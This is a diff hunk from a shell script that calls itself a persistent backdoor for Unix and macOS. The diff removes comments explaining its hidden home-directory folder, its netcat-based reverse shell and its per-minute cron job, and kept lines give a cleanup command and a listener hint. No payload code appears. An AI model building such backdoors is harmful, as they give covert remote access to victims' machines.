@@ -3,9 +3,6 @@
 #FOR EDUCATIONAL PURPOSES ONLY 
 #We do not carry responsibility for how you use this... You ,the user, are self responsible for any damage caused running this script.
 
-#This script is a persistent backdoor working on both Unix and OSX systems. It creates a hidden user-supplied directory inside victim's home root. A check is made if the current 
-#system has netcat installed and chooses the payload appropriately. Afterwards, a cronjob gets created which calls the script every minute by default. Simply use nc -lvp PORT to catch the shell. 
-
 #Backdoor can be removed from the system using - "rm -rf ~/.DirectoryName/; crontab -r"
                                                                                                                                                 
 #Change these variables.                                                  
